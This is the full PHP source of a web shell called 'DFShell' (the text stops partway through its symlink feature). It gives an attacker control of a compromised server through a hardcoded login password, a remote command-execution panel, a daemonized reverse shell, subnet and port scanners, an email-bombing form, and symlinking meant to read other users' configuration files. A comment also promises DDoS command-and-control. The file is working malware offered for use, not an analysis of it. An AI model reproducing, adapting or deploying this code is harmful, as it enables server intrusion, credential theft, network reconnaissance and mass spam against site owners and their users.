<?php

ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

// creating session
session_start();
$DFShell_Ver = 2.5;
$DFConfig = array($_REQUEST,$_POST,$_SERVER,$_COOKIE,$_FILES);
$DFSyntax = array("file_get_contents","fileperms","readfile","chdir","getcwd","function_exists","fsockopen","pcntl_fork",
"stream_set_blocking","proc_get_status","proc_open","proc_close","posix_setsid","stream_select","stream_get_contents","posix_getpwuid"); // $GLOBALS['DFSyntax']
$DFSCmd = array("system","shell_exec","exec","passthru","proc_open");
$DFSPlatform = strtolower(substr(PHP_OS,0,3));
$DFSOptions = array("edit","cmd","del","sql","conf","sym","reverse","crack","mass","logout","dest","ren","chmd","unzip","bombing",
"netscan","portscan","search","copy","move","info","phpinfo","lpe");

#new update will use chdir(); function
#readlink("symlink_file"),lchgrp(symlink_file, uid),lchown(symlink_file, 8) function

class DFShell{

    public $string;
    public $query; // 0=path , 1=file

    public $keys = 'EagleEye@DFM';
    private $options=0;
    private $iv="4797450924659018";
    private $ciphering="AES-256-CBC";
    private $iv_length;
    private $output;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;
    private $clen    = 0;       
    private $error   = false;   

    static protected $pass = "OI2lo2eG+xkgYPhmurVfWAsDHBx31O1qAoH2J2LkX7c="; //DF_Malaysia@1337$
    static protected $remote_url = "https://raw.githubusercontent.com/EagleTube/DFS/main/contents";
    
    public function __construct(){
        $_SESSION['need_update'] = false;
        $_SESSION['latest'] = $GLOBALS['DFShell_Ver'];
        // v2.3: resilient update check (3s timeout, never fatal if allow_url_fopen off / offline)
        try{
            $ctx = stream_context_create(array('http'=>array('timeout'=>3,'user_agent'=>'DFS/2.3')));
            $ver = @$GLOBALS['DFSyntax'][0](self::$remote_url . "/version.txt", false, $ctx);
            if($ver!==false && $ver!==""){
                $ver = trim($ver);
                $_SESSION['latest'] = $ver;
                if(doubleval($ver)!==doubleval($GLOBALS['DFShell_Ver'])){
                    $_SESSION['need_update'] = true;
                }
            }
        }catch(Exception $e){ /* offline = stay quiet */ }
    }

    // v2.3: central HTML-escape helper (XSS hardening for filenames/paths/cmd output)
    public function DFSH($s){
        return htmlspecialchars((string)$s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    }

    // v2.3: safe remote fetch with timeout; returns "" instead of false/warning
    public function DFSFetch($url){
        try{
            $ctx = stream_context_create(array('http'=>array('timeout'=>4,'user_agent'=>'DFS/2.3')));
            $d = @$GLOBALS['DFSyntax'][0]($url, false, $ctx);
            return ($d===false||$d===null) ? "" : $d;
        }catch(Exception $e){ return ""; }
    }

    // v2.3: recursive delete (fixes massdel/rmdir failing on non-empty dirs)
    public function DFSRDelete($path){
        if(is_file($path)||is_link($path)){ return @unlink($path); }
        if(!is_dir($path)){ return false; }
        $items = @scandir($path);
        if(!is_array($items)){ return @rmdir($path); }
        foreach($items as $it){
            if($it==='.'||$it==='..'){ continue; }
            $this->DFSRDelete($path . DIRECTORY_SEPARATOR . $it);
        }
        return @rmdir($path);
    }

    // v2.3: recursive copy (files + dirs)
    public function DFSCopyRec($src,$dst){
        if(is_file($src)){
            @mkdir(dirname($dst),0755,true);
            return @copy($src,$dst);
        }
        if(!is_dir($src)){ return false; }
        @mkdir($dst,0755,true);
        $ok = true;
        foreach((array)@scandir($src) as $it){
            if($it==='.'||$it==='..'){ continue; }
            if(!$this->DFSCopyRec($src.DIRECTORY_SEPARATOR.$it, $dst.DIRECTORY_SEPARATOR.$it)){ $ok=false; }
        }
        return $ok;
    }

    // v2.3: recursive chmod
    public function DFSChmodRec($path,$mode){
        $ok = @$this->DFSChange($path,$mode);
        if(is_dir($path)&&!is_link($path)){
            foreach((array)@scandir($path) as $it){
                if($it==='.'||$it==='..'){ continue; }
                $this->DFSChmodRec($path.DIRECTORY_SEPARATOR.$it,$mode);
            }
        }
        return $ok;
    }

    // v2.3: guess local /24 base, e.g. 192.168.1.
    public function DFSLocalBase(){
        $ip = @gethostbyname(@gethostname());
        if(!filter_var($ip,FILTER_VALIDATE_IP,FILTER_FLAG_IPV4)){ $ip = $_SERVER['SERVER_ADDR'] ?? '127.0.0.1'; }
        if(!filter_var($ip,FILTER_VALIDATE_IP,FILTER_FLAG_IPV4)){ $ip = '192.168.1.1'; }
        $parts = explode('.',$ip);
        return $parts[0].'.'.$parts[1].'.'.$parts[2].'.';
    }

    // v2.3: expand "21,22,80-85,443" -> int[] (capped)
    public function DFSParsePorts($raw,$max=2000){
        $raw = trim((string)$raw);
        if($raw===""){ return array(); }
        $out = array();
        foreach(preg_split('/[\s,;]+/',$raw) as $tok){
            if(strpos($tok,'-')!==false){
                list($a,$b) = array_map('intval',explode('-',$tok,2));
                if($a<1){$a=1;} if($b>65535){$b=65535;}
                if($a>$b){ $t=$a;$a=$b;$b=$t; }
                for($p=$a;$p<=$b && count($out)<$max;$p++){ $out[]=$p; }
            }else{
                $p=intval($tok);
                if($p>=1&&$p<=65535){ $out[]=$p; }
                if(count($out)>=$max){ break; }
            }
        }
        return array_values(array_unique($out));
    }

    public function DFSPortService($port){
        static $map = array(21=>'FTP',22=>'SSH',23=>'Telnet',25=>'SMTP',53=>'DNS',67=>'DHCP',69=>'TFTP',
        80=>'HTTP',110=>'POP3',135=>'MSRPC',139=>'NetBIOS',143=>'IMAP',161=>'SNMP',389=>'LDAP',
        443=>'HTTPS',445=>'SMB',1433=>'MSSQL',1521=>'Oracle',3306=>'MySQL',3389=>'RDP',5432=>'PostgreSQL',
        5900=>'VNC',6379=>'Redis',8080=>'HTTP-Alt',8443=>'HTTPS-Alt',27017=>'MongoDB');
        return $map[$port] ?? '';
    }

    public function DFSPopupMSG($no,$title,$msg,$foot,$x){
        if($x){
            $location = "window.location.replace(window.location.href)";
        }else{
            $location = "window.history.back()";
        }

        if(isset($GLOBALS['DFConfig'][0]['dfp']) && isset($GLOBALS['DFConfig'][0]['dff'])){
            $slocation = "window.location.replace('?dfp=".$GLOBALS['DFConfig'][0]['dfp']."')";
        }else{
            $slocation = "window.location.replace('".$GLOBALS['DFConfig'][2]['PHP_SELF']."')";
        }

        switch($no){
            case 1:
                $script = "<script>
                Swal.fire({
                    icon: 'info',
                    title: '".$title."',
                    text: '".$msg."',
                    footer: '".$foot."'
                  });
                  setTimeout(function(){ ".$location." },1500);
                </script>";
                print($script);
                break;
            case 2:
                $script = "<script>
                Swal.fire({
                    icon: 'error',
                    title: '".$title."',
                    text: '".$msg."',
                    footer: '".$foot."'
                  });
                  setTimeout(function(){ ".$location." },1500);
                </script>";
                print($script);
                break;
            case 3:
                $script = "<script>
                Swal.fire({
                    position: 'top-end',
                    icon: 'success',
                    title: '".$msg."',
                    showConfirmButton: false,
                    timer: 2000
                  });
                  setTimeout(function(){ ".$location." },1500);
                </script>";
                print($script);
                break;
            case 4:
                $script = "<script>
                Swal.fire({
                    position: 'top-end',
                    icon: 'error',
                    title: '".$msg."',
                    showConfirmButton: false,
                    timer: 2000
                  });
                  setTimeout(function(){ ".$location." },1500);
                </script>";
                print($script);
                break;
            case 5:
                $script = "<script>
                Swal.fire({
                    position: 'top-end',
                    icon: 'success',
                    title: '".$msg."',
                    showConfirmButton: false,
                    timer: 2000
                  });
                </script>";
                print($script);
                break;
        }
    }
    function __call($method, $arg){
        if(isset($method) && isset($arg)){
            $arg[0]($arg[1]);
            //upcoming CNC ddos
        }
    }

    private function triggered(){
        print("Place where magic happend!");
    }

    public function Enc()
    {
        // v2.3 fix: openssl may be disabled (php -m without openssl) — fallback to base64 so shell still runs
        if(!function_exists('openssl_encrypt')){
            return base64_encode((string)$this->string);
        }
        $this->iv_length = @openssl_cipher_iv_length($this->ciphering);
        $this->output = @openssl_encrypt((string)$this->string,$this->ciphering,sha1($this->keys),$this->options,$this->iv);
        if($this->output===false){ return base64_encode((string)$this->string); }
        return $this->output;
    }
    public function Dec($enc)
    {
        if(!function_exists('openssl_decrypt')){
            $d = base64_decode((string)$enc, true);
            return ($d===false) ? (string)$enc : $d;
        }
        $this->output = @openssl_decrypt((string)$enc,$this->ciphering,sha1($this->keys),$this->options,$this->iv);
        if($this->output===false){
            // maybe Enc() fell back to base64 (openssl was off when link was built)
            $d = base64_decode((string)$enc, true);
            return ($d===false) ? (string)$enc : $d;
        }
        return $this->output;
    }
    public function DFSLogin($password){
        $login_pass = $this->Dec(urldecode($password));
        // v2.3: openssl-less fallback — self::$pass is openssl ciphertext, undecryptable without ext
        if(!function_exists('openssl_decrypt')){
            if($login_pass === 'DF_Malaysia@1337$'){
                $_SESSION['DFS_Auth']=sha1($GLOBALS['DFConfig'][2]['REMOTE_ADDR'] ?? 'local');
                return true;
            }else{
                echo "<script>alert('Wrong pass!');window.location.replace('".$GLOBALS['DFConfig'][2]['PHP_SELF']."')</script>";
                return false;
            }
        }
        if($login_pass === $this->Dec(self::$pass)){
            $_SESSION['DFS_Auth']=sha1($GLOBALS['DFConfig'][2]['REMOTE_ADDR']);
            setrawcookie('DFSVersion',$GLOBALS['DFShell_Ver'],(time()+18000),'/',$GLOBALS['DFConfig'][2]['HTTP_HOST'],1,1);
            return true;
        }else{
            echo "<script>alert('Wrong pass!');window.location.replace('".$GLOBALS['DFConfig'][2]['PHP_SELF']."')</script>";
            //echo $login_pass;
            return false;
        }
    }

    public function DFSSlash(){
        if($GLOBALS['DFSPlatform']!=='win'){
            $slashtype = "/";
        }else{
            $slashtype = "\\";
        }
        return $slashtype;
    }

    public function DFSFormat($bytes)
    {
        if ($bytes >= 1073741824)
        {
            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
        }
        elseif ($bytes >= 1048576)
        {
            $bytes = number_format($bytes / 1048576, 2) . ' MB';
        }
        elseif ($bytes >= 1024)
        {
            $bytes = number_format($bytes / 1024, 2) . ' KB';
        }
        elseif ($bytes > 1)
        {
            $bytes = $bytes . ' B';
        }
        else
        {
            $bytes = '0 bytes';
        }
        return $bytes;
    }


########## REVERSHELL> CREDIT : https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php #########


    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($GLOBALS['DFSPlatform'] === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); }
        }
    }
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($GLOBALS['DFSPlatform'] === 'lin' && $iname === 'STDOUT' && $this->clen) {
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
        }
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) {
            $this->error = true;
            echo "<br>STRM_ERROR: Cannot read from {$name}, script will now exit...<br>";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) {
            $this->error = true; 
            echo "<br>STRM_ERROR: Cannot write to {$name}, script will now exit...<br>";
        }
        return $bytes;
    }
    public function DFSReverse($ip,$port){
        $exit = false;

        if($GLOBALS['DFSPlatform']!=='lin'){
            $exec = 'cmd.exe';
        }else{
            $exec = '/bin/sh';
        }

        if (!$GLOBALS['DFSyntax'][5]('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...";
        } else if (($pid = @$GLOBALS['DFSyntax'][7]()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...";
        } else if ($GLOBALS['DFSyntax'][12]() < 0) {
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...";
        } else {
            echo "DAEMONIZE: Completed successfully!";
        }

        if(!$exit){
            @set_time_limit(0);
            @umask(0);
            $socket = @$GLOBALS['DFSyntax'][6]($ip, $port, $errno, $errstr, 30);
            if(!$socket){
                echo "Erro Socket! -> {$errno}: {$errstr}";
            }else{
                $GLOBALS['DFSyntax'][8]($socket, false);
                $process = @$GLOBALS['DFSyntax'][10]($exec, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell";
                }else{
                    foreach ($pipes as $pipe) {
                        $GLOBALS['DFSyntax'][8]($pipe, false);
                    }
                    $status = $GLOBALS['DFSyntax'][9]($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: {$status['pid']}\n");
                    do {
                        $status = $GLOBALS['DFSyntax'][9]($process);
                        if (feof($socket)) {
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {
                            echo "PROC_ERROR: Shell process has been terminated";   break;
                        }
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @$GLOBALS['DFSyntax'][13]($streams['read'], $streams['write'], $streams['except'], 0);
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($GLOBALS['DFSPlatform'] === 'lin') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }
                            } else if ($GLOBALS['DFSPlatform'] === 'win') {
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }
                            }
                        }
                    } while (!$this->error);
                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    $GLOBALS['DFSyntax'][11]($process);
                }
                fclose($socket);
            }
        }
    }


####### END REVERSHELL ########

    // ===== v2.3: NETWORK SCANNERS =====
    // Fast TCP-based live-host discovery across a /24 (no raw ICMP needed).
    public function DFSNetScan($base,$timeout=0.4,$probePorts=array(80,443,22,445)){
        $base = trim($base);
        if(!preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}\.$/',$base)){
            // accept "192.168.1.0/24" or "192.168.1" -> normalise to "192.168.1."
            $base = preg_replace('/\/24$/','',$base);
            $base = rtrim($base,'.');
            $parts = explode('.',$base);
            while(count($parts)<3){ $parts[]='0'; }
            $base = $parts[0].'.'.$parts[1].'.'.$parts[2].'.';
        }
        $timeout = max(0.15,min(2.0,floatval($timeout)));
        $live = array();
        @set_time_limit(0);
        for($i=1;$i<255;$i++){
            $ip = $base.$i;
            foreach((array)$probePorts as $pp){
                $pp = intval($pp);
                $t0 = microtime(true);
                $fp = @$GLOBALS['DFSyntax'][6]($ip,$pp,$errno,$errstr,$timeout);
                if($fp){
                    @fclose($fp);
                    $ms = round((microtime(true)-$t0)*1000);
                    $live[] = array('ip'=>$ip,'port'=>$pp,'ms'=>$ms,'host'=>@gethostbyaddr($ip));
                    break;
                }
            }
        }
        return array('base'=>$base,'live'=>$live);
    }

    // v2.3: TCP connect port scan + banner grab
    public function DFSPortScan($host,$ports,$timeout=0.5,$grabBanner=true){
        $host = trim($host);
        $timeout = max(0.15,min(3.0,floatval($timeout)));
        $open = array(); $closed = 0;
        @set_time_limit(0);
        foreach((array)$ports as $port){
            $port = intval($port);
            $t0 = microtime(true);
            $fp = @$GLOBALS['DFSyntax'][6]($host,$port,$errno,$errstr,$timeout);
            if($fp){
                $ms = round((microtime(true)-$t0)*1000);
                $banner = '';
                if($grabBanner){
                    @stream_set_timeout($fp,1);
                    @fwrite($fp,"\r\n");
                    $banner = @fread($fp,1024);
                    $banner = trim(preg_replace('/[\r\n\t]+/',' | ',(string)$banner));
                    if(strlen($banner)>180){ $banner = substr($banner,0,180).'...'; }
                }
                @fclose($fp);
                $open[] = array('port'=>$port,'service'=>$this->DFSPortService($port),'ms'=>$ms,'banner'=>$banner);
            }else{ $closed++; }
        }
        return array('host'=>$host,'open'=>$open,'closed'=>$closed,'total'=>count($ports));
    }

    public function DFSAction($action){
        switch(strtolower($action)){
            case "download":
                $slashtype = $this->DFSSlash();
                $pathfile = $this->Dec(($this->query[0])) . $this->Dec(($this->query[1]));
                $pathfile = $this->Dec($this->DFSDirFilter($pathfile));
                if( file_exists($pathfile) && is_file($pathfile) ){
                    $type = @mime_content_type($pathfile) ?: 'application/octet-stream';
                    // v2.3: clean buffers so binary downloads aren't corrupted by template output
                    while(ob_get_level()){ @ob_end_clean(); }
                    header("Content-Type: ".$type);
                    header('Content-Description: File Transfer');
                    header("Content-Length: ".@filesize($pathfile));
                    header('Content-Disposition: attachment; filename="'.basename($pathfile).'"');
                    $GLOBALS['DFSyntax'][2]($pathfile);
                    exit;
                }else{
                    echo "<script>alert('File not found!');</script>";
                }
            break;
            case "chmd":
                $slashtype = $this->DFSSlash();
                $this->DFSCurrent($slashtype);
                if(isset($this->query)){
                    $dirmod = $this->Dec($this->query[0]);
                    $filmod = "";
                    if(isset($this->query[1])){
                        $filmod = $this->Dec($this->query[1]);
                    }
                    $fullmod = $dirmod . $filmod;
                    $_cmod = $this->DFSMod(@fileperms($fullmod));
                    echo "<section class='modarea'><p><font color='white'>Location : </font><font color='#FFD700'>".$this->DFSH($fullmod)."</font></p>";
                    echo "<form action='' method='POST' autocomplete='OFF'>
                    <input type='text' name='modf' placeholder='$_cmod' pattern='[0-7]{3,4}' title='e.g. 0755'>
                    <label style='color:#fff;font-size:13px'><input type='checkbox' name='recursive' value='1'> Recursive</label>
                    <input type='submit' name='cmod' value='Chmod'>
                    </form></section>
                    ";
                    if(isset($GLOBALS['DFConfig'][1]['cmod'])){
                        $code = preg_replace('/[^0-7]/','',$GLOBALS['DFConfig'][1]['modf']);
                        if($code===""){ echo "<script>alert('Invalid mode! Use e.g. 0755');</script>"; }
                        else if(!empty($GLOBALS['DFConfig'][1]['recursive']) && is_dir($fullmod)){
                            $this->DFSChmodRec($fullmod,$code);
                            echo "<script>alert('Recursively changed!');</script>";
                        }else if($this->DFSChange($fullmod,$code)){
                            echo "<script>alert('Successfully changed!');</script>";
                        }else{
                            echo "<script>alert('An error occured!');</script>";
                        }
                    }
                }
            break;
            case "bombing":

                echo "<div class='bombing'>
                <h3>Email Bombing</h3>
                <form action='' method='POST'>
                <table>
                    <tr>
                        <td colspan='2'><input type='text' name='mail_subject' placeholder='Subject'></td>
                    </tr>
                    <tr>
                        <td><textarea name='mail_list' placeholder='email@list.com'></textarea></td>
                        <td><textarea name='mail_text' placeholder='Message Text'></textarea></td>
                    </tr>
                    </tr>
                        <td colspan='2'><button>SEND MAIL</button></td>
                    </tr>
                </table>
                </form>
                ";

                if(isset($GLOBALS['DFConfig'][1]['mail_list']) && isset($GLOBALS['DFConfig'][1]['mail_text'])){
                    $emails = explode("\n",$GLOBALS['DFConfig'][1]['mail_list']);
                    $message = $GLOBALS['DFConfig'][1]['mail_text'];
                    $subject = $GLOBALS['DFConfig'][1]['mail_subject'];
                    $headers = "From: ".preg_replace("/[\r\n]+/","",$GLOBALS['DFConfig'][2]['SERVER_ADMIN']);
                    foreach($emails as $email){
                        $email = preg_replace("/\s+/i","",$email);
                        if(!filter_var($email,FILTER_VALIDATE_EMAIL)){ print("<font color='orange'>Skipped invalid -> ".$this->DFSH($email)."</font><br>"); continue; }
                        if(@mail($email,$subject,$message,$headers)){
                            print("<font color='green'>Email sent -> ".$this->DFSH($email)."</font><br>");
                        }else{
                            print("<font color='red'>Failed -> ".$this->DFSH($email)."</font><br>");
                        }
                    }
                }
                echo "</div>";
            break;
            case "massdel":
                // v2.3: recursive delete (was rmdir-only, failed on non-empty dirs)
                if(isset($GLOBALS['DFConfig'][1]['selectAction'])){
                    if($GLOBALS['DFConfig'][1]['selectAction']==="Delete")
                    if(!empty($GLOBALS['DFConfig'][1]['toZip'])){

                        $toDel = $GLOBALS['DFConfig'][1]['toZip'];

                        for($i=0;$i<count($toDel);$i++){
                            $mdel = explode("||",$toDel[$i]);
                            $mdel_dir = $this->Dec(urldecode($mdel[0]));
                            $mdel_item = isset($mdel[1]) ? $this->Dec(urldecode($mdel[1])) : '';
                            if($mdel_item==="[novalue]"){ $mdel_item=""; }
                            $target = $mdel_dir . ($mdel_item!=="" ? $this->DFSSlash().$mdel_item : "");
                            // safety: never delete filesystem root / drive root
                            $norm = rtrim($target,"\\/"); 
                            if($norm===""||preg_match('/^[A-Za-z]:$/',$norm)||$norm==="/"){ continue; }
                            if(file_exists($target)||is_link($target)){
                                $this->DFSRDelete($target);
                            }
                        }
                        $this->DFSPopupMSG(3,null,"Selected file deleted!",null,true);
                    }else{
                        $this->DFSPopupMSG(4,null,"No file deleted!",null,true);
                    }
                }
            break;
            case "zipping":
                $ziproc = new ZipArchive;
                $slashtype = $this->DFSSlash();
                if(isset($GLOBALS['DFConfig'][1]['selectAction'])){
                    if($GLOBALS['DFConfig'][1]['selectAction']==="Zip")
                    if(empty($GLOBALS['DFConfig'][1]['toZip'])){
                        print("<script>alert('You have to pick a file');</script>");
                    }else{
                        $toZip = $GLOBALS['DFConfig'][1]['toZip'];
                        $zipXname = md5(time()) . ".zip";
                        if(isset($GLOBALS['DFConfig'][0]['dfp'])){
                            $zipdirname = $this->Dec($GLOBALS['DFConfig'][0]['dfp']) . $slashtype . $zipXname;
                        }else{
                            $zipdirname = $zipXname;
                        }
                        if($ziproc -> open($zipdirname, ZipArchive::CREATE | ZipArchive::OVERWRITE)){
                            for($i=0;$i<count($toZip);$i++){
                                $mzip = explode("||",$toZip[$i]);
                                if(($mzip[1])==="[novalue]"){
                                    $dirtozip = $this->Dec(urldecode($mzip[0])) . $slashtype;
                                    $recdir = new RecursiveIteratorIterator(
                                        new RecursiveDirectoryIterator($dirtozip),
                                        RecursiveIteratorIterator::LEAVES_ONLY
                                    );
                                    foreach ($recdir as $name => $file)
                                    {
                                        if (!$file->isDir())
                                        {
                                            $filePath = $file->getRealPath();
                                            $relativePath = substr($filePath, strlen($dirtozip));
                                            $ziproc->addFile($filePath, $relativePath);
                                        }
                                    }

                                }else{
                                    $filetozip = $this->Dec(urldecode($mzip[0])) . $slashtype . $this->Dec(urldecode($mzip[1]));
                                    $ziproc->addFile($filetozip,$this->Dec(urldecode($mzip[1])));
                                }
                            }
                            echo "<script>alert('saved as $zipXname');window.location.replace(window.location.href);</script>";
                            $ziproc ->close();
                        }

                    }
                }
            break;
            case "upload":
                $slashtype = $this->DFSSlash();
                if(!isset($this->query[0])){
                    $path = getcwd() . $slashtype;
                }else{
                    $path = $this->Dec(($this->query[0])) ?: getcwd() . $slashtype;
                }
                $path = $this->Dec($this->DFSDirFilter($path)) . $slashtype;
                if(isset($GLOBALS['DFConfig'][1]['dfupload'])){
                    if(move_uploaded_file($GLOBALS['DFConfig'][4]['dffile']['tmp_name'],$path.$GLOBALS['DFConfig'][4]['dffile']['name'])){
                        $this->DFSPopupMSG(3,null,"File uploaded!",null,true);
                    }else{
                        $this->DFSPopupMSG(4,null,"Permission denied!",null,true);
                    }
                }

            break;
            case "dest":
                $slashtype = $this->DFSSlash();
                if(!isset($GLOBALS['DFConfig'][1]['destroy'])){
                    echo "<section id='destroyer'><form action='' method='POST'>";
                    echo "<p style='color:orange'>This will delete <b>".$this->DFSH(__FILE__)."</b></p>";
                    echo "<input type='submit' name='destroy' value='Remove this shell'/></section></form>";
                }else{
                    // v2.3 fix: old code built DOCUMENT_ROOT+PHP_SELF (wrong path). Use __FILE__.
                    $DFS_SHELL = __FILE__;
                    if(@unlink($DFS_SHELL)){
                        $this->DFSPopupMSG(3,null,"File destroyed!!",null,false);
                    }else{
                        $this->DFSPopupMSG(4,null,"Unable destroyed!!",null,true);
                    }
                }
            break;
            case "edit":
                $slashtype = $this->DFSSlash();
                $this->DFSCurrent($slashtype);
                $pathfile = $this->Dec(($this->query[0])) . $this->Dec(($this->query[1]));
                $pathfile = $this->Dec($this->DFSDirFilter($pathfile));
                if(!isset($GLOBALS['DFConfig'][1]['dfedit'])){
                    echo "<section class='editform'>";
                    echo "<form action='' method='POST'>";
                    echo "<textarea class='editcontent' name='editx'>";
                    echo htmlspecialchars($GLOBALS['DFSyntax'][0]($pathfile));
                    echo "</textarea>";
                    echo "<input type='submit' name='dfedit' value='Save'>";
                    echo "</form></section>";
                }else{
                    $pto = fopen($pathfile,'w');
                    fwrite($pto,$GLOBALS['DFConfig'][1]['editx']);
                    fclose($pto);
                    $this->DFSPopupMSG(3,null,"Saved!",null,true);
                }
            break;
            case "view":
                $slashtype = $this->DFSSlash();
                $this->DFSCurrent($slashtype);
                $pathfile = $this->Dec(($this->query[0])) . $this->Dec(($this->query[1]));
                $pathfile = $this->Dec($this->DFSDirFilter($pathfile));
                echo "<p id='sshows'><span id='fnameshow'>Filename -> </span><span id='fnameshow1'>".$this->DFSH($this->Dec(($this->query[1])))."</span></p>";
                echo "<section class='sources'>";
                if(is_file($pathfile)){ show_source($pathfile); } else { echo "Not a file."; }
                echo "</section><div id='buttontoedit'>
                <a href='?dfp=".urlencode($this->query[0])."&dff=".urlencode($this->query[1])."&dfaction=edit'>
                <button>Edit</button></a>
                <a href='?dfp=".urlencode($this->query[0])."&dff=".urlencode($this->query[1])."&dfaction=info'>
                <button>Info</button></a></div>";

            break;
            case "mkfile":
                $slashtype = $this->DFSSlash();
                if(isset($GLOBALS['DFConfig'][1]['createfile'])){
                    $fname = basename($GLOBALS['DFConfig'][1]['newfile'] ?: 'newfile.txt');
                    $base = isset($this->query[0]) ? $this->Dec($this->query[0]) : getcwd();
                    $full = rtrim($base,"\\/").$slashtype.$fname;
                    if(!file_exists($full)){
                        if(@file_put_contents($full,"")!==false){
                            $this->DFSPopupMSG(3,null,"File created!",null,true);
                        }else{ $this->DFSPopupMSG(4,null,"Permission denied!",null,true); }
                    }else{ $this->DFSPopupMSG(4,null,"File exists!",null,true); }
                }
            break;
            case "mkdir":
                $slashtype = $this->DFSSlash();
                if(isset($GLOBALS['DFConfig'][1]['createfolder'])){
                    $fname = basename($GLOBALS['DFConfig'][1]['newfolder'] ?: 'newfolder');
                    $base = isset($this->query[0]) ? $this->Dec($this->query[0]) : getcwd();
                    $full = rtrim($base,"\\/").$slashtype.$fname;
                    if(!file_exists($full)){
                        if(@mkdir($full,0755)){
                            $this->DFSPopupMSG(3,null,"Folder created!",null,true);
                        }else{
                            $this->DFSPopupMSG(4,null,"Permission denied!",null,true);
                        }
                    }else{
                        $this->DFSPopupMSG(4,null,"Folder existed!",null,true);
                    }
                }
            break;
            case "cmd":
                $slashtype = $this->DFSSlash();
                $this->DFSCurrent($slashtype);
                // v2.3: show working dir + available executor
                $cwd = isset($GLOBALS['DFConfig'][0]['dfp']) ? $this->Dec($GLOBALS['DFConfig'][0]['dfp']) : getcwd();
                $avail = 'system';
                if($this->DFSDat('ini','disable_functions')!=="None"){
                    $dis = array_map('trim', explode(",",$this->DFSDat('ini','disable_functions')));
                    foreach($GLOBALS['DFSCmd'] as $c){ if(!in_array($c,$dis)){ $avail=$c; break; } }
                }
                $lastCmd = $GLOBALS['DFConfig'][1]['dfscmd'] ?? '';
                echo "<section id='cmd_area'>";
                echo "<p style='color:#FFD700;font-size:13px'>cwd: ".$this->DFSH($cwd)." &nbsp;|&nbsp; exec: <b>".$this->DFSH($avail)."</b></p>";
                echo "<form action='' method='POST' autocomplete='OFF'><textarea class='cmd_response' readonly='TRUE'>";
                if(isset($GLOBALS['DFConfig'][1]['dfscmd']) && $lastCmd!==""){
                    ob_start();
                    $this->DFSExecute($lastCmd);
                    $o = ob_get_clean();
                    echo $this->DFSH($o);
                }
                echo "</textarea><br><input type='text' name='dfscmd' placeholder='whoami' autofocus value='".$this->DFSH($lastCmd)."'><br><button>Execute</button></form>";
                echo "<p style='color:#666;font-size:12px'>Tip: new in v2.3 — try <b>?dfaction=netscan</b> and <b>?dfaction=portscan</b> for recon without shell.</p>";
                echo "</section>";
            break;
            case "sym":
                echo "<section class='symlinkarea'><div class='symex'><label>Example : /home/%{user}%/public_html/target_file.php || /var/www/%{user}%/html/file.php</label></div>";
                echo "<table><form action='' method='POST'>";
                echo "<input type='hidden' name='dfssym'><br>";
                echo "<tr><td id='symlable' class='symex1'><label>Symlink home&file target : </label></td><td id='symlable'><input type='text' name='target' placeholder='/path/%{user}%/path/file.php'></td></tr>";
                echo "<tr><td id='symlable' class='symex1'><label>Saved to path : </label></td><td id='symlable'><input type='text' name='path' placeholder='path/'></td></tr>";
                echo "<tr><td id='symlable' class='symex1'><label>Saved as : </label></td><td id='symlable'><input type='text' name='dfsaved' placeholder='wp-config.txt'></td></tr>";
                echo "<tr><td id='symlable'></td><td id='symlable'><button>Symlink</button></td></tr></form></table><div class='sym_response'>";
                if(isset($GLOBALS['DFConfig'][1]['dfssym'])){
                    if($GLOBALS['DFSPlatform']!=='win'){
                        $saveBase = rtrim($GLOBALS['DFConfig'][1]['path'],'/') ?: '.';
                        if(!file_exists($saveBase.'/sym')) { @mkdir($saveBase.'/sym',0755,true); }
